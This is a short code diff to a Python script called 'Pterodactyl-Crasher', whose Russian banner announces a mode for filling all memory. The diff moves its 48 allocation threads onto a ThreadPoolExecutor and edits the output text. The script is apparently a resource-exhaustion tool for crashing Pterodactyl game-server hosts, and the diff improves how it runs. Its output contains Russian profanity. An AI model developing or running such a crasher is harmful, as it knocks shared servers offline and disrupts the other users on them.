@@ -1,5 +1,6 @@
-import threading
+import concurrent.futures
 import subprocess
+import threading
 import uuid
 from time import sleep
 
@@ -37,15 +38,13 @@ def display_status():
 
 
 def main():
-    print("github.com/xdearboy/Pterodactyl-Crasher \n Pterodactyl-Crasher")
+    print("github.com/xdearboy/Pterodactyl-Crasher \n\nPterodactyl-Crasher")
     print("Режим: забивка всей памяти")
     print("Подготовка..")
 
-    threads = []
-    for _ in range(48):
-        thread = threading.Thread(target=allocate_space)
-        thread.start()
-        threads.append(thread)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=48) as executor:
+        for _ in range(48):
+            executor.submit(allocate_space)
 
     print("Ебанный рот, погнали нахуй!")
     status_thread = threading.Thread(target=display_status)
